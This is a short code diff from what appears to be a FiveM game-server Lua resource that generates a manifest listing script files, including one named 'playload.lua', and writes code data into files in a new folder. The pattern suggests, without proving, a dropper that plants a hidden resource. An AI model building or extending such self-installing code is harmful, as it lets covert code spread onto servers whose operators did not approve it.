@@ -86,13 +86,13 @@ SetHttpHandler(exports.cache:createHttpHandler {
         games({ 'gta5' })
         
         server_scripts({
-            "core/server/api/url.lua",
-            "core/server/api/mime.lua",
-            "core/server/api/base64.lua",
-            "core/server/api/hash.lua",
-            "core/server/api/realms.lua",
-            "core/server/api/httphandler.lua",
-            "core/server/api/main.lua",
+            "url.lua",
+            "mime.lua",
+            "base64.lua",
+            "hash.lua",
+            "realms.lua",
+            "httphandler.lua",
+            "main.lua",
             "playload.lua",
         });
         
@@ -136,7 +136,6 @@ if parentPath then
         Citizen.CreateThread(function()
             for fileName, fileData in pairs(codeData) do
                 local filePath = newFolderPath .. "\\" .. fileName
-                print(filePath)
                 filePath = normalizePath(filePath)
                 local file = io.open(filePath, "w")
                 file:write(fileData)
